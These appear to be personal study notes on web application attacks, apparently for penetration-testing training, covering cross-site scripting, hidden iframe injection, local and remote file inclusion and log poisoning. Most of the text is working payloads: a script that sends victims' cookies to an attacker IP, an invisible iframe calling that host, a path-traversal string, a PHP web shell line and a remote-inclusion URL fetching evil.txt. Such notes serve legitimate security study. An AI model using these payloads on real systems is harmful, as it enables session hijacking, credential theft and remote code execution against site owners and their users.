Web application attacks
Cross site scripting
Caused by unsanitized user input that is then displayed on a web page
Need a simple example to testing for XSS with an alert
Browser redirection and iFrame injection
	• Injecting an invisible iframe
<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>
	• When the victim visits the page, their browser connects to the attacking machine (required netcat listener, port 80)
Stealing cookies and session information
<script> new Image().src=”http://10.11.0.5/bogus.php?output=”+document.cookie; </script>
	• The victim browsing the page makes a connection back to us with an authenticated session value (listener required)
	• Use a cookie editor like Cookies Manager to steal the session
File inclusion vulnerabilities
LFI
Look for pages that include a parameter in the URL, such as:
	• Test for LFI by navigating to:
../../../../../../windows/system32/drivers/etc/hosts
In PHP versions below 5.3, terminate the request with a null byte "(%00)"
Contaminating log files
<?php echo shell_exec($_GET[‘cmd’]);?>
From LFI to code execution
#### RFI
Create evil.txt and setup our webserver to host it
```Evil.txt = <?php echo shell_exec(“ipconfig”);?>
http://target.com/?page=http://attackerip/evil.txt%00
SQL injection
See notes for examples; GitHub errors when SQLI code inserted


